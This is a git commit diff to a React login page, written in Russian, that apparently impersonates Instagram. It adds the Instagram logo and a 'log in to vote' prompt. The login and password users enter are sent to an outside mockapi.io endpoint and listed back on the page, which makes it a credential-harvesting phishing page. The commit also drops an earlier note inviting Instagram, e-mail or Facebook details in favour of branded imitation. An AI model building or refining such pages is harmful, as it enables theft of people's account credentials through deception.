aec6ae5783999830e89eb06025e539188f1aa19b
Ehson Zokirov <zokirov_2000@mail.ru>
2023-02-18 01:11:06 +0500

    1:10

--- src/App.jsx
+++ src/App.jsx
@@ -1,12 +1,13 @@
 import "./App.css";
 import React, { useEffect, useState } from "react";
 import axios from "axios";
+import logo from "./img/Instagram-Logo-PNG-HD-Isolated.png";
 
 function App() {
   const url = `https://63d0e533120b32bbe8eca000.mockapi.io/Todo`;
   const [card, setCard] = useState([]);
   const [text, setText] = useState("");
-  const [password, setPassword] = useState(0);
+  const [password, setPassword] = useState();
 
   const getFunction = async () => {
     try {
@@ -16,9 +17,12 @@ function App() {
   };
   const postFunction = async () => {
     try {
-      const { data } = await axios.post(url, {  title: text,  message: password,});
-      setText('')
-      setPassword('')
+      const { data } = await axios.post(url, {
+        title: text,
+        message: password,
+      });
+      setText("");
+      setPassword("");
       console.log(data);
     } catch (error) {}
   };
@@ -30,47 +34,46 @@ function App() {
     getFunction();
   });
   return (
-    <div className="bg-gray-500 h-[100vh]">
-      <div className=" gap-3 p-2 space-x-5 text-center py-20 md:py-40">
-        <h1 className="text-[30px] font-bold my-10">Вход на сайт</h1>
+    <div className=" md:bg-gradient-to-r bg-gradient-to-b from-blue-500 via-purple-500 to-pink-500 h-[100vh] bg1">
+      <div className=" gap-3 p-2 space-x-5 text-center pt-20 md:w-[30%] pb-20 container mx-auto">
+        {/* <h1 className="text-[30px] font-bold my-10">Вход на сайт</h1> */}
+        <div className="md:my-10 ">
+          <img className="m-auto" width={"150px"} src={logo} alt="logo" />
+        </div>
         <div className="grid gap-5">
           <div>
+            <p className="mb-5 animate-pulse text-[black] ">
+              Войдите в аккаунт чтобы голосавать !
+            </p>
             <input
-              className="px-5 md:w-[20%] py-2 rounded-md outline-none hover:bg-slate-200 "
+              className="px-5 w-[100%] md:w-[80%] py-2 rounded-md outline-none hover:bg-slate-300 transition hover:duration-1000 ease-in-out"
               value={text}
               onChange={(e) => setText(e.target.value)}
               type="text"
-              required
               placeholder="Логин"
             />
           </div>
           <div>
             <input
-              className="px-5 md:w-[20%] py-2 rounded-md outline-none hover:bg-slate-200 "
+              className="px-5 w-[100%] md:w-[80%] py-2 rounded-md outline-none active:bg-slate-500 hover:bg-slate-300 transition hover:duration-1000 ease-in-out"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               type="password"
-              required
               placeholder="Пароль"
             />
           </div>
           <div>
             <button
-              className="bg-slate-300 md:w-[20%] px-5 py-2 col-span-2 rounded-md active:bg-slate-400 hover:bg-slate-200 duration-75 "
+              className="bg-slate-300 w-[100%] md:w-[80%] px-5 py-2 col-span-2 rounded-md active:bg-slate-400 hover:bg-slate-400 transition hover:duration-500 ease-in "
               onClick={() => {
                 postFunction();
-                alertback(); 
-                
+                alertback();
               }}
             >
               войти
             </button>
           </div>
         </div>
-        <p className="my-5 text-gray-400 animate-pulse ">
-          Для входа на сайт вы можете вводит данные instagram, e-mail или
-          facebook .
-        </p>
       </div>
       <ul className=" bg-gray-500">
         {card.map((e) => {
